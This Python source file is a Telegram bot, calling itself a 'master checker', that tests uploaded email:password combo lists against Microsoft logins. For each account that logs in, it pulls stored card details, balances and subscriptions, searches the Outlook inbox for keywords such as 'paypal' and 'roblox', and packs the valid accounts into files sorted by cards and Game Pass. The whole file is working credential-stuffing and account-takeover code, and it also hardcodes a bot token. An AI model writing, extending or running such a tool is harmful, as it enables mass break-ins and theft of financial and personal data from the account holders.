import asyncio
import aiohttp
import json
import logging
import os
import re
import time
import zipfile
import shutil
import uuid
from urllib.parse import urlparse, parse_qs, quote
from aiohttp import web
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ============================================================
# CONFIG
# ============================================================
BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
ADMIN_IDS = [7595790309]
MAX_CONCURRENT = 5 # Lowered heavily for heavy API requests
TIMEOUT = 25
TEMP_DIR = "./temp"

# SFTAG (Web Login) Config
SFTAG_CLIENT_ID = "00000000402B5328"
SFTAG_URL = f"https://login.live.com/oauth20_authorize.srf?client_id={SFTAG_CLIENT_ID}&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
ATK_CLIENT_ID = "000000000004773A"

# Outlook Lite Config
OUTLOOK_CLIENT_ID = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
OUTLOOK_REDIRECT = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
OUTLOOK_SCOPE = "profile openid offline_access https://outlook.office.com/M365.Access"

UA_EDGE = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
UA_ANDROID = "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("nyx")
os.makedirs(TEMP_DIR, exist_ok=True)

def parse_lr(text: str, left: str, right: str) -> str:
    try:
        s = text.index(left) + len(left)
        e = text.index(right, s)
        return text[s:e]
    except ValueError:
        return ""

# ============================================================
# FLOW 1: SFTAG WEB LOGIN & PAYMENT API (Xbox/Cards/Subs)
# ============================================================
async def sftag_login(session, email, password):
    headers = {"User-Agent": UA_EDGE}
    try:
        async with session.get(SFTAG_URL, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            body = await r.text()
            post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
            ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
            
            if not post_url or not ppft:
                return None

            payload = {
                'i13': '1', 'login': email, 'loginfmt': email, 'type': '11', 'LoginOptions': '1', 
                'passwd': password, 'ps': '2', 'PPFT': ppft, 'PPSX': 'PassportR', 'NewUser': '1', 
                'FoundMSAs': '', 'fspost': '0', 'i21': '0', 'CookieDisclosure': '0', 'IsFidoSupported': '0', 'i19': '9960'
            }
            
            async with session.post(post_url, data=payload, headers=headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
                loc = r2.headers.get("Location", "")
                if "access_token=" not in loc:
                    text = await r2.text()
                    if "account or password is incorrect" in text.lower() or r2.status == 401:
                        return "bad"
                    if "identity/confirm" in loc or "recover" in loc:
                        return "2fa"
                    return None
                    
                ms_token = parse_lr(loc, "access_token=", "&")
                cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
                cid = cid.value.upper() if cid else ""
                return {"ms_token": ms_token, "cid": cid}
    except Exception:
        return None

async def get_pifd_atk(session):
    url = f"https://login.live.com/oauth20_authorize.srf?client_id={ATK_CLIENT_ID}&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
    try:
        async with session.get(url, headers={"User-Agent": UA_EDGE}, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            loc = r.headers.get("Location", "")
            return parse_lr(loc, "access_token=", "&token_type")
    except: return ""

async def get_payment_data(session, atk):
    headers = {"User-Agent": UA_EDGE, "Authorization": f'MSADELEGATE1.0="{atk}"', "Accept": "application/json"}
    cards = []
    country = "Unknown"
    balance = ""
    subs = []

    # 1. Payment Instruments (Cards & Country)
    try:
        url1 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
        async with session.get(url1, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                body = await r.text()
                cc = parse_lr(body, '"country":"', '"')
                if cc: country = cc.upper()
                bal = parse_lr(body, 'balance":', ',"')
                if bal: balance = bal.strip().strip('"')
                
                data = await r.json()
                for item in data.get("items", data.get("paymentInstruments", [])):
                    last4 = item.get("lastFourDigits", "")
                    if last4:
                        cards.append(f"{item.get('paymentMethodFamily', 'CC')} *{last4} ({item.get('expiryMonth', '')}/{item.get('expiryYear', '')})")
    except: pass

    # 2. Transactions (Subscriptions & GamePass)
    try:
        url2 = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
        async with session.get(url2, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                for sub in data.get("subscriptions", []):
                    subs.append(f"{sub.get('title', 'Sub')} ({sub.get('totalAmount', '')} {sub.get('currency', '')})")
    except: pass

    return {"cards": cards, "country": country, "balance": balance, "subs": subs}

# ============================================================
# FLOW 2: OUTLOOK OAUTH & SUBSTRATE (Inbox Search)
# ============================================================
async def outlook_login(session, email, password):
    url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id={OUTLOOK_CLIENT_ID}&scope={quote(OUTLOOK_SCOPE)}&redirect_uri={quote(OUTLOOK_REDIRECT)}"
    headers = {"User-Agent": UA_ANDROID, "X-Requested-With": "com.microsoft.outlooklite"}
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            body = await r.text()
            post_url = parse_lr(body, 'urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
            ppft = parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"') or parse_lr(body, 'name="PPFT" value="', '"')
            if not post_url or not ppft: return None

            payload = f"i13=1&login={quote(email)}&loginfmt={quote(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={quote(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={quote(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            post_headers = {"User-Agent": UA_ANDROID, "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "com.microsoft.outlooklite", "Origin": "https://login.live.com"}
            
            async with session.post(post_url, data=payload, headers=post_headers, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r2:
                loc = r2.headers.get("Location", "")
                code = parse_lr(loc, "code=", "&")
                if not code: return None
                
                cid = session.cookie_jar.filter_cookies(post_url).get("MSPCID")
                cid = cid.value.upper() if cid else ""
                
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                token_payload = f"client_info=1&client_id={OUTLOOK_CLIENT_ID}&redirect_uri={quote(OUTLOOK_REDIRECT)}&grant_type=authorization_code&code={code}&scope={quote(OUTLOOK_SCOPE)}"
                async with session.post(token_url, data=token_payload, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r3:
                    if r3.status == 200:
                        data = await r3.json()
                        return {"atk": data.get("access_token"), "cid": cid}
    except: pass
    return None

async def search_outlook(session, atk, cid, email, keywords):
    headers = {"Authorization": f"Bearer {atk}", "X-AnchorMailbox": f"CID:{cid}", "User-Agent": "Outlook-Android/2.0", "Content-Type": "application/json"}
    hits = {}
    
    # Get Region
    region = "Unknown"
    try:
        async with session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
            if r.status == 200:
                data = await r.json()
                region = data.get("location", "Unknown").upper()
    except: pass

    # Search Keywords
    for kw in keywords:
        query = f"from:{kw}" if "@" in kw else kw
        payload = {
            "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off",
            "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "From": 0, "Query": {"QueryString": query}, "Size": 5}],
            "LogicalId": str(uuid.uuid4())
        }
        try:
            async with session.post("https://substrate.office.com/search/api/v2/query", json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                if r.status == 200:
                    data = await r.json()
                    total = data.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                    if total > 0:
                        # Try to extract Roblox username if Roblox keyword is found
                        raw = json.dumps(data)
                        uname = "Unknown"
                        if "roblox" in kw.lower():
                            m = re.search(r'account:\s*([a-zA-Z0-9_]+)\.', raw)
                            if m: uname = m.group(1)
                        hits[kw] = {"count": total, "extra": uname}
        except: pass
        
    return {"region": region, "hits": hits}

# ============================================================
# MASTER CHECKER
# ============================================================
async def check_account(session, email, password, keywords):
    res = {"email": email, "pw": password, "status": "bad", "region": "Unknown", "cards": [], "subs": [], "hits": {}, "roblox": "N/A"}
    
    # 1. Web Login (SFTAG) -> Payment & Xbox
    jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(cookie_jar=jar) as sftag_session:
        login_res = await sftag_login(sftag_session, email, password)
        if login_res == "bad":
            return res
        if login_res == "2fa":
            res["status"] = "2fa"
            return res
        if not login_res:
            return res
            
        res["status"] = "valid"
        
        # Get PIFD ATK & Payment Data
        atk = await get_pifd_atk(sftag_session)
        if atk:
            pay_data = await get_payment_data(sftag_session, atk)
            res["region"] = pay_data["country"]
            res["cards"] = pay_data["cards"]
            res["subs"] = pay_data["subs"]
            
    # 2. Outlook OAuth -> Inbox Search (if keywords provided)
    if keywords:
        async with aiohttp.ClientSession() as out_session:
            out_login = await outlook_login(out_session, email, password)
            if out_login:
                out_data = await search_outlook(out_session, out_login["atk"], out_login["cid"], email, keywords)
                if out_data["region"] != "Unknown":
                    res["region"] = out_data["region"]
                res["hits"] = out_data["hits"]
                for kw, data in out_data["hits"].items():
                    if "roblox" in kw.lower() and data["extra"] != "Unknown":
                        res["roblox"] = data["extra"]

    return res

# ============================================================
# PROCESSING
# ============================================================
async def process_combos(combos, keywords, chat_id, status_msg, bot):
    results = []
    done, total, t_start, last_edit = 0, len(combos), time.time(), 0.0
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 2, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        async def worker(email, password):
            nonlocal done, last_edit
            async with sem: r = await check_account(session, email, password, keywords)
            results.append(r); done += 1
            now = time.time()
            if now - last_edit >= 4.0 or done == total:
                last_edit = now
                hits = sum(1 for x in results if x["status"] == "valid")
                bad = sum(1 for x in results if x["status"] == "bad")
                tfa = sum(1 for x in results if x["status"] == "2fa")
                elapsed = now - t_start
                try:
                    await status_msg.edit_text(f"<b>Master Checker...</b>\nprogress: <code>{done}/{total}</code>\nvalid: <b>{hits}</b> | 2fa: <b>{tfa}</b>\nbad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code> | {elapsed:.1f}s", parse_mode=ParseMode.HTML)
                except: pass
        await asyncio.gather(*(worker(e, p) for e, p in combos))

    elapsed = time.time() - t_start
    valid = [r for r in results if r["status"] == "valid"]
    bad = [r for r in results if r["status"] == "bad"]
    tfa = [r for r in results if r["status"] == "2fa"]
    
    ts = int(time.time()); workdir = os.path.join(TEMP_DIR, f"run_{ts}"); os.makedirs(workdir, exist_ok=True)

    def write_file(name, lines):
        with open(os.path.join(workdir, name), "w") as f: f.write("\n".join(lines))

    # Generate rich output matching all script formats
    rich_valid = []
    for r in valid:
        card_str = ", ".join(r["cards"]) if r["cards"] else "None"
        sub_str = ", ".join(r["subs"]) if r["subs"] else "None"
        hit_str = ", ".join(f"{k}({v['count']})" for k, v in r["hits"].items()) if r["hits"] else ""
        
        line = f"{r['email']}:{r['pw']} | Region: {r['region']} | Cards: [{card_str}] | Subs: [{sub_str}]"
        if hit_str: line += f" | Hits: [{hit_str}]"
        if r["roblox"] != "N/A": line += f" | Roblox: {r['roblox']}"
        rich_valid.append(line)

    write_file("valid_rich.txt", rich_valid)
    write_file("valid.txt", [f"{r['email']}:{r['pw']}" for r in valid])
    write_file("invalid.txt", [f"{r['email']}:{r['pw']}" for r in bad])
    write_file("2fa.txt", [f"{r['email']}:{r['pw']}" for r in tfa])
    
    # GamePass specifically
    gp = [f"{r['email']}:{r['pw']} | {', '.join(r['subs'])}" for r in valid if any("pass" in s.lower() for s in r["subs"])]
    if gp: write_file("gamepass.txt", gp)
    
    # Cards specifically
    cc = [f"{r['email']}:{r['pw']} | {', '.join(r['cards'])}" for r in valid if r["cards"]]
    if cc: write_file("cards.txt", cc)

    write_file("summary.txt", [f"Time: {time.strftime('%Y-%m-%dT%H:%M:%S')}", f"Checked: {total}", f"Valid: {len(valid)}", f"Invalid: {len(bad)}", f"2FA: {len(tfa)}"])

    zip_path = os.path.join(TEMP_DIR, f"results_{ts}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in os.listdir(workdir): zf.write(os.path.join(workdir, fname), arcname=fname)

    await status_msg.edit_text(f"<b>✅ done</b>\n\ntotal: <code>{total}</code>\nvalid: <b>{len(valid)}</b>\ntime: <code>{elapsed:.1f}s</code>", parse_mode=ParseMode.HTML)
    await bot.send_document(chat_id, FSInputFile(zip_path, filename=f"results_{len(valid)}_valid.zip"))
    shutil.rmtree(workdir, ignore_errors=True)
    try: os.remove(zip_path)
    except: pass

# ============================================================
# TELEGRAM HANDLERS
# ============================================================
bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return await msg.answer("not authorized.")
    await msg.answer("<b>master checker</b>\n\nsend a .txt file with <code>email:password</code>\nreply to it with <code>/kw paypal, roblox</code> to search inbox.")

@dp.message(F.document)
async def handle_file(msg: types.Message):
    if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
    if not msg.document.file_name.lower().endswith(".txt"): return await msg.answer("send a .txt file.")
    
    keywords = []
    if msg.reply_to_message and msg.reply_to_message.text and msg.reply_to_message.text.startswith("/kw"):
        kw_str = msg.reply_to_message.text.replace("/kw", "").strip()
        keywords = [k.strip() for k in kw_str.split(",") if k.strip()]
        
    status = await msg.answer("downloading...")
    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
    try:
        tg = await bot.get_file(msg.document.file_id)
        await bot.download_file(tg.file_path, local)
    except Exception as e: return await status.edit_text(f"download failed: {e}")
    
    combos = []
    with open(local, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if ":" in line and not line.startswith("#") and "t.me" not in line:
                e, p = line.split(":", 1)
                if e and p: combos.append((e, p))
    os.remove(local)
    
    if not combos: return await status.edit_text("no valid combos found.")
    kw_msg = f" | {len(keywords)} keywords" if keywords else ""
    await status.edit_text(f"loaded <code>{len(combos)}</code> combos{kw_msg} — starting...")
    await process_combos(combos, keywords, msg.chat.id, status, bot)

# ============================================================
# WEB SERVER FOR RENDER
# ============================================================
async def web_server():
    app = web.Application()
    app.router.add_get("/", lambda r: web.Response(text="Bot is running"))
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server started on port {port}")

async def main():
    asyncio.create_task(web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
